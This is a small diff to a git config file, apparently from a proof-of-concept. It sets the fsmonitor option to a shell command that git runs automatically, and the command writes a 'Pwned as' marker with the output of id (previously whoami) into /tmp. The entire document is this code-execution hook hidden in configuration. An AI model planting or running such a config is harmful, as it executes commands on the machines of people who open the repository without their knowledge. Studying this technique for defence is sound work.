@@ -2,4 +2,4 @@
     repositoryformatversion = 0
     bare = false
     worktree = ./
-    fsmonitor = "echo \"Pwned as $(whoami)\">/tmp/11.txt; false"
+    fsmonitor = "echo \"Pwned as $(id)\">/tmp/11.txt; false"
